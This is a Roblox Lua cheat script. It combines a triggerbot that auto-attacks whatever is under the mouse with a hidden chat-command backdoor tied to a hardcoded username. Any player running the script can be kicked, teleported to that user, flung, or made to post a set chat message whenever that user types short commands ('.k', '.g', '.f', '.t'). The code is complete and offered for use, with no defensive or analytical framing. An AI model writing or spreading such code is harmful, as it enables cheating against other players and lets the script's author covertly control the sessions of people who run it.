-- Triggerbot + less-suspicious commands targeting everyone (.g/.s/.f/.k/.t)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local Settings = {
    Enabled = false,
    CounterEnabled = true,
    ToggleKey = Enum.KeyCode.Q,
    CounterToggleKey = Enum.KeyCode.L,
    MaxDistance = 1000,
    BlacklistedTools = { "Knife" },
    SpamPerSecond = 600,
}

local VIPUser = "draconvm" -- your username

local BlacklistedTools = {}
for _, name in ipairs(Settings.BlacklistedTools) do
    BlacklistedTools[name] = true
end

local BringTargets = {}

-- Helper functions
local function isAlive(character)
    local hum = character and character:FindFirstChildOfClass("Humanoid")
    return hum and hum.Health > 0
end

local function getUsableTool(character)
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") and not BlacklistedTools[tool.Name] then
            return tool
        end
    end
end

-- Triggerbot
RunService.RenderStepped:Connect(function(dt)
    if not Settings.Enabled then return end
    local myChar = LocalPlayer.Character
    if not myChar or not isAlive(myChar) then return end
    local tool = getUsableTool(myChar)
    if not tool then return end
    local targetPart = Mouse.Target
    if targetPart then
        local char = targetPart:FindFirstAncestorOfClass("Model")
        if char and isAlive(char) then
            if tool and tool.Parent ~= myChar then
                myChar:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
            end
            local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
            for i = 1, spamRate do
                task.defer(function()
                    if tool and tool.Activate then
                        tool:Activate()
                    end
                end)
            end
        end
    end
end)

-- Bring loop
RunService.RenderStepped:Connect(function()
    for targetName, _ in pairs(BringTargets) do
        local targetPlayer = Players:FindFirstChild(targetName)
        local vipPlayer = Players:FindFirstChild(VIPUser)
        if targetPlayer and targetPlayer.Character and vipPlayer and vipPlayer.Character then
            local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if vipRoot and targetRoot then
                targetRoot.CFrame = vipRoot.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
end)

-- ==============================
-- Chat commands
-- ==============================
local function onMessage(senderName, message)
    if senderName:lower() ~= VIPUser:lower() then return end
    local msg = message:lower()

    -- Kick everyone except VIP
    if msg == ".k" then
        if LocalPlayer.Name:lower() ~= VIPUser:lower() then
            LocalPlayer:Kick("Kicked by VIP")
        end
    end

    -- Bring everyone
    if msg == ".g" then
        BringTargets[LocalPlayer.Name] = true
    end

    -- Stop bringing everyone
    if msg == ".s" then
        BringTargets[LocalPlayer.Name] = nil
    end

    -- Fling everyone (reusable)
    if msg == ".f" then
        local char = LocalPlayer.Character
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                local bodyVelocity = Instance.new("BodyVelocity")
                bodyVelocity.Velocity = Vector3.new(math.random(-500,500), 300, math.random(-500,500))
                bodyVelocity.MaxForce = Vector3.new(1e5,1e5,1e5)
                bodyVelocity.P = 1e4
                bodyVelocity.Parent = root
                task.delay(0.3, function() bodyVelocity:Destroy() end)
            end
        end
    end

    -- Force chat: "I love Kherby"
    if msg == ".t" then
        local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if ChatService then
            local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
            if SayMessage then
                SayMessage:FireServer("I love Kherby", "All")
            end
        end
    end
end

-- Chat hooks
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.MessageReceived:Connect(function(msg)
        local src = msg.TextSource
        if src then
            local sender = Players:GetPlayerByUserId(src.UserId)
            if sender then
                onMessage(sender.Name, msg.Text)
            end
        end
    end)
else
    local function hook(plr)
        plr.Chatted:Connect(function(msg)
            onMessage(plr.Name, msg)
        end)
    end
    for _, p in ipairs(Players:GetPlayers()) do hook(p) end
    Players.PlayerAdded:Connect(hook)
end
